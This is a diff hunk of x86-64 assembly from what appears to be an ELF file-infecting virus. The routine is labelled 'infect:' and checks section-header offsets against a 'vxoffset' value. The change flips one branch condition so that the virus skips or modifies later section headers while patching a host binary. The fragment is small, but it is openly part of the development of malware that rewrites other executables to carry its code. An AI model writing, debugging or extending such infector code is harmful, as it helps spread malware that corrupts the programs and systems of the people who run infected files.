@@ -988,7 +988,8 @@ infect:
 			mov r11, [r13 + r15 + elf_shdr.sh_offset]
 			;cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			cmp dword r11d, vxoffset
-			jge .mod_subsequent_shdr
+			jl .next_shdr
+			;jge .mod_subsequent_shdr
 			mov rdx, modvxshdrpass0len
 			lea rsi, modvxshdrpass0
 			mov rdi, STDOUT
